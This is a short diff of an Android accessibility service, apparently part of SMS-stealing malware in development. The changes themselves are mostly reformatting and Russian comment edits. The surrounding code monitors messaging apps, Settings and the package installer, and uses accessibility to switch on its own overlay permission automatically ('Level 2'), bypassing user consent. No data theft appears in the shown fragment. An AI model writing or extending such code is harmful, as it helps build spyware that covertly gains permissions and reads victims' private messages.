@@ -11,7 +11,6 @@ import android.provider.Settings;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-
 import java.util.List;
 
 public class SmsAccessibilityService extends AccessibilityService {
@@ -19,9 +18,7 @@ public class SmsAccessibilityService extends AccessibilityService {
     private Handler handler = new Handler(Looper.getMainLooper());
     private boolean isGrantingPermission = false;
 
-    public static SmsAccessibilityService getInstance() {
-        return instance;
-    }
+    public static SmsAccessibilityService getInstance() { return instance; }
 
     @Override
     public void onServiceConnected() {
@@ -32,11 +29,8 @@ public class SmsAccessibilityService extends AccessibilityService {
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.notificationTimeout = 100;
         info.packageNames = new String[]{
-                "com.google.android.apps.messaging",
-                "com.android.mms",
-                "com.samsung.android.messaging",
-                "com.android.settings",
-                "com.android.packageinstaller"
+                "com.google.android.apps.messaging", "com.android.mms", "com.samsung.android.messaging",
+                "com.android.settings", "com.android.packageinstaller"
         };
         setServiceInfo(info);
     }
@@ -54,7 +48,7 @@ public class SmsAccessibilityService extends AccessibilityService {
         });
     }
 
-    // АВТОМАТИЧЕСКАЯ ВЫДАЧА SYSTEM_ALERT_WINDOW
+    // Уровень 2: Accessibility автоматически включает тумблер в настройках
     public void grantOverlayPermission() {
         isGrantingPermission = true;
         handler.post(() -> {
@@ -64,7 +58,7 @@ public class SmsAccessibilityService extends AccessibilityService {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             } catch (Exception e) {
-                Log.e("SMS_ACCESS", "Ошибка открытия настроек окон", e);
+                Log.e("SMS_ACCESS", "Ошибка открытия настроек", e);
                 isGrantingPermission = false;
             }
         });
